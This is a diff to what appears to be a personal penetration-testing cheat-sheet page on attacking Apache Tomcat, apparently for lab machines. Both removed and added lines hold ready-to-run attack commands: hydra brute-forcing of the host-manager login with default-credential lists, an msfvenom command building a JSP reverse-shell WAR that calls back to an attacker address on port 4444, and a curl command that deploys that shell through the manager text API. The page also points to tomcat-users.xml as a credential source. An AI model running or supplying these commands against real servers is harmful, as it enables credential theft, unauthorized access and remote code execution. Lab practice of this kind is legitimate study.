@@ -986,31 +986,26 @@ layout: default
 		<li>AJP / port 8009</li>
 	</ul>
 
-	<li>Default creds list - /seclists/passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt</li>
-	<li>File with login creds - /tomcat/conf/tomcat-users.xml</li>
-
-	<li>manager webapp</li>
-	<ul>
-		<li>&lt;ip address&gt;:8080/manager/text/deploy</li>
-		<li>Deploy .war shell for RCE</li>
-		<ul>
-			<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war</li>
-		</ul>
-	</ul>
-
-	<li>Tomcat Files / Directory layout</li>
-	<ul>
-		<li>https://archlinux.org/packages/extra/any/tomcat9/files/</li>
-	</ul>
-
-	<li>Brute force</li>
+	<li>Brute force tomcat credentials</li>
 	<ul>
 		<li>hydra -L words.lst -P words.lst http-get://10.0.0.25:8080/host-manager/html</li>
+		<li>hydra -C   /seclists/passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.0.25:8080/host-manager/html</li>
 	</ul>
 
-	<li>Deploy .war shell to /manager/html</li>
+	<li>File with tomcat credentials - tomcat-users.xml</li>
 	<ul>
-		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war > shell.war</li>
+		<li>Can be found in various locations</li>
+		<li>Search apache version + Ubuntu to find the ubuntu distribution that is most likely running on the box.  Then google the distribution name + tomcat in order to find the tomcat file directories installed on the box.</li>
+	</ul>
+
+	<li>Deploy .war reverse shell</li>
+	<ul>
+		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war &gt; shell.war</li>
+		<li>manager-gui - /manager/html/</li>
+		<li>manager-script - /manager/text/</li>
+		<ul>
+			<li>curl -u &apos;&lt;username&gt;:&lt;password&gt;&apos; http://10.129.241.149:8080/manager/text/deploy?path=/shell --upload-file shell.war</li>
+		</ul>
 	</ul>
 
 	<hr>
